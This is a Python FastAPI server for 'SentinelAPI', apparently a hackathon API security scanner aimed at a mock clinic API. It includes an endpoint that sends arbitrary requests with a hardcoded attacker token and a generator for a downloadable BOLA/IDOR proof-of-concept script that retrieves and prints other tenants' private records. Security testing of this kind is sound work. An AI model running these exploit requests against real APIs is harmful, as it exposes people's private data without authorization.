"""
SentinelAPI - Web Server & Audit API
Built for AmiHacks 1.0 (Track C)
"""

from fastapi import FastAPI, HTTPException, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from pydantic import BaseModel
from typing import Optional, Dict, Any, List
import requests
import json
import time
import os
import re
import yaml

from backend.scanner_engine import APISecurityAuditor, SensitiveDataDetector

app = FastAPI(
    title="SentinelAPI Scanner",
    description="Automated OpenAPI Security Audit Tool",
    version="1.0"
)

# Store scan results in memory
SCAN_RUNS: List[Dict[str, Any]] = []

class ScanRequest(BaseModel):
    target_url: str = "http://127.0.0.1:8001"
    spec_url: Optional[str] = None
    spec_raw: Optional[str] = None

@app.get("/api/target/status")
def check_target():
    """Checks if the mock target API is currently online."""
    try:
        r = requests.get("http://127.0.0.1:8001/api/v1/health", timeout=1.5)
        if r.status_code == 200:
            return {"status": "online", "port": 8001, "api_name": "Apex Clinic API"}
    except Exception:
        pass
    return {"status": "offline", "port": 8001}

@app.post("/api/scan")
def trigger_audit(req: ScanRequest):
    """Executes the security scan against the given OpenAPI endpoint."""
    target_url = req.target_url.rstrip("/")
    spec_data = {}

    if req.spec_raw:
        try:
            spec_data = json.loads(req.spec_raw)
        except Exception:
            spec_data = yaml.safe_load(req.spec_raw)
    elif req.spec_url:
        try:
            r = requests.get(req.spec_url, timeout=5)
            spec_data = r.json()
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Could not load spec from {req.spec_url}: {e}")
    else:
        try:
            r = requests.get(f"{target_url}/openapi.json", timeout=5)
            spec_data = r.json()
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Could not find openapi.json at {target_url}: {e}")

    # Run the auditor
    auditor = APISecurityAuditor(target_base_url=target_url, openapi_spec=spec_data)
    results = auditor.run_audit()
    results["id"] = f"AUDIT-{int(time.time())}"

    SCAN_RUNS.insert(0, results)
    return results

@app.get("/api/scans/latest")
def get_latest_scan():
    if not SCAN_RUNS:
        return {"status": "no_scans"}
    return SCAN_RUNS[0]

class ExploitRequest(BaseModel):
    method: str
    url: str
    auth_header: Optional[str] = "Bearer tok_alice_9981a"
    body: Optional[Dict[str, Any]] = None

@app.post("/api/exploit/execute")
def execute_live_exploit(req: ExploitRequest):
    """Executes a real-time HTTP exploit request and returns latency & response."""
    start = time.time()
    headers = {"Accept": "application/json"}
    if req.auth_header:
        headers["Authorization"] = req.auth_header

    try:
        r = requests.request(req.method, req.url, headers=headers, json=req.body, timeout=4)
        latency = round((time.time() - start) * 1000, 1)
        resp_json = None
        try:
            resp_json = r.json()
        except Exception:
            pass

        from backend.bola_oracle import ResponseDiffer

        resp_str = json.dumps(resp_json) if resp_json else r.text
        sensitive_findings = SensitiveDataDetector.scan_payload(resp_json) if resp_json else []
        
        # Rigorous verification: Requires verified sensitive data leaks or victim identity anchors
        victim_anchors = {"102", "bob", "bob_miller", "bob.m@example.com", "5002", "581-22-3491"}
        received_anchors, anchor_paths = ResponseDiffer.extract_identity_anchors(resp_json) if resp_json else (set(), [])
        matched_victim_anchors = sorted(list(victim_anchors.intersection(received_anchors)))

        is_leaked = (
            r.status_code in [200, 201, 204] and (
                len(sensitive_findings) > 0 or len(matched_victim_anchors) > 0
            )
        )

        return {
            "status_code": r.status_code,
            "latency_ms": latency,
            "headers": dict(r.headers),
            "response": resp_json if resp_json is not None else r.text,
            "is_leaked": is_leaked,
            "sensitive_findings": sensitive_findings,
            "matched_victim_anchors": matched_victim_anchors
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Exploit execution failed: {e}")


@app.get("/api/report/html/{scan_id}", response_class=HTMLResponse)
def export_html_report(scan_id: str):
    """Generates a clean, printable technical audit summary."""
    scan = next((s for s in SCAN_RUNS if s["id"] == scan_id), None)
    if not scan and SCAN_RUNS:
        scan = SCAN_RUNS[0]
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")

    findings_rows = ""
    for f in scan["findings"]:
        findings_rows += f"""
        <div style="border: 1px solid #334155; border-radius: 8px; padding: 16px; margin-bottom: 20px; background: #0f172a;">
            <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                <strong style="color: {'#ef4444' if f['severity'] == 'CRITICAL' else ('#f97316' if f['severity'] == 'HIGH' else '#eab308')};">[{f['severity']}] {f['id']}</strong>
                <span style="font-family: monospace; color: #94a3b8;">{f['method']} {f['endpoint']}</span>
            </div>
            <h4 style="margin: 0 0 6px 0; color: #f1f5f9;">{f['title']}</h4>
            <p style="color: #cbd5e1; font-size: 13px; line-height: 1.5;">{f['description']}</p>
            <div style="margin-top: 10px;">
                <div style="font-size: 12px; font-weight: bold; color: #38bdf8; margin-bottom: 4px;">Reproduction cURL:</div>
                <pre style="background: #1e293b; color: #e2e8f0; padding: 10px; border-radius: 6px; font-size: 12px; overflow-x: auto;">{f.get('reproduction_curl', '')}</pre>
            </div>
            <div style="margin-top: 10px;">
                <div style="font-size: 12px; font-weight: bold; color: #10b981; margin-bottom: 4px;">Recommended Code Patch:</div>
                <pre style="background: #1e293b; color: #a7f3d0; padding: 10px; border-radius: 6px; font-size: 12px; overflow-x: auto;">{f.get('fix_code', '')}</pre>
            </div>
        </div>
        """

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>API Security Audit Report - {scan['id']}</title>
        <style>
            body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #020617; color: #f8fafc; padding: 30px; }}
            .container {{ max-width: 860px; margin: 0 auto; }}
            @media print {{ body {{ background: white; color: black; }} }}
        </style>
    </head>
    <body>
        <div class="container">
            <button onclick="window.print()" style="margin-bottom: 20px; padding: 8px 16px; background: #0284c7; color: white; border: none; border-radius: 4px; cursor: pointer;">Print / Save as PDF</button>
            <h2>API Security Audit Report ({scan['id']})</h2>
            <p><strong>Target:</strong> {scan['target_url']} | <strong>Score:</strong> {scan['summary']['score']}/100 ({scan['summary']['grade']}) | <strong>Date:</strong> {scan['timestamp']}</p>
            <hr style="border-color: #334155; margin: 20px 0;">
            {findings_rows}
        </div>
    </body>
    </html>
    """
    return html

static_path = os.path.join(os.path.dirname(__file__), "..", "static")
from fastapi.responses import PlainTextResponse

@app.get("/api/exploit/download")
async def download_exploit(
    target: str,
    exploit_type: str = "BOLA",
    endpoint: Optional[str] = None,
    method: Optional[str] = "GET"
):
    target = target.rstrip("/")
    probe_endpoint = endpoint if endpoint else "/api/v1/patients/102"
    if not probe_endpoint.startswith("/"):
        probe_endpoint = "/" + probe_endpoint
    # Normalize path parameters to standard test vectors
    probe_endpoint = re.sub(r"\{[a-zA-Z0-9_]+\}", "102", probe_endpoint)
    probe_method = (method or "GET").upper()

    code = f'''#!/usr/bin/env python3
"""
SentinelAPI - Dynamic Exploit Reproduction Proof-of-Concept (PoC)
Generated by SentinelAPI Enterprise Security Engine for AmiHacks 1.0 (Track C)

Vulnerability Category: {exploit_type}
Target Host:           {target}
Target Endpoint:       {probe_endpoint}
HTTP Method:           {probe_method}
"""

import requests
import json
import time
import sys

TARGET_HOST = "{target}"
ENDPOINT = "{probe_endpoint}"
TARGET_URL = f"{{TARGET_HOST}}{{ENDPOINT}}"

# Attacker Identity (Tenant A principal with valid authentication but zero object ownership)
ATTACKER_AUTH_HEADER = "Bearer tok_alice_9981a"

def banner():
    print("=" * 68)
    print("  SENTINEL-API : AUTOMATED VULNERABILITY REPRODUCTION PROOF-OF-CONCEPT")
    print(f"  Target: {probe_method} {{TARGET_URL}}")
    print(f"  Class:  {exploit_type}")
    print("=" * 68)

def execute_reproduction_test():
    banner()
    print("[*] Dispatching authorized cross-tenant request via Tenant A credentials...")
    headers = {{
        "Authorization": ATTACKER_AUTH_HEADER,
        "Accept": "application/json",
        "User-Agent": "SentinelAPI-VerificationEngine/1.0"
    }}
    
    start_time = time.time()
    try:
        response = requests.request("{probe_method}", TARGET_URL, headers=headers, timeout=5)
        duration_ms = round((time.time() - start_time) * 1000, 2)
        
        print(f"[*] Server Response: HTTP {{response.status_code}} (RTT: {{duration_ms}}ms)")
        
        if response.status_code == 200:
            print("\\n[!] EXPLOIT CONFIRMED: VULNERABILITY VERIFIED!")
            print("[!] Broken Object Level Authorization (BOLA/IDOR) succeeded.")
            print("[!] Tenant A successfully retrieved private object belonging to another tenant.")
            print("\\n--- Leaked Object Payload ---")
            try:
                print(json.dumps(response.json(), indent=2))
            except Exception:
                print(response.text[:500])
            print("-----------------------------")
            sys.exit(1)
        elif response.status_code == 403:
            print("\\n[✓] VERIFICATION PASSED: Object ownership properly enforced.")
            print("[✓] Server returned HTTP 403 Forbidden. Cross-tenant access blocked.")
            sys.exit(0)
        else:
            print(f"[-] Received unexpected response code: {{response.status_code}}")
            print(response.text[:300])
    except requests.exceptions.ConnectionError:
        print(f"[!] Error: Could not connect to {{TARGET_HOST}}. Ensure the target service is online.")
        sys.exit(2)
    except Exception as e:
        print(f"[!] Request error: {{e}}")
        sys.exit(2)

if __name__ == "__main__":
    execute_reproduction_test()
'''
    clean_cat = exploit_type.lower().replace(' ', '_').replace(':', '')
    clean_filename = f"sentinel_poc_{clean_cat}.py"
    return PlainTextResponse(content=code, headers={
        "Content-Disposition": f'attachment; filename="{clean_filename}"'
    })

app.mount("/static", StaticFiles(directory=static_path), name="static")

@app.get("/", response_class=FileResponse)
def serve_index():
    return FileResponse(os.path.join(static_path, "index.html"))

@app.get("/slides", response_class=FileResponse)
def serve_slides():
    return FileResponse(os.path.join(static_path, "slides.html"))

@app.get("/download-pptx", response_class=FileResponse)
def download_pptx():
    pptx_path = os.path.join(os.path.dirname(__file__), "..", "SentinelAPI_Presentation.pptx")
    if os.path.exists(pptx_path):
        return FileResponse(pptx_path, filename="SentinelAPI_Presentation.pptx", media_type="application/vnd.openxmlformats-officedocument.presentationml.presentation")
    raise HTTPException(status_code=404, detail="File not found")

@app.get("/report", response_class=FileResponse)
def serve_report():
    """Serves the printable hackathon submission report."""
    return FileResponse(os.path.join(static_path, "report.html"))


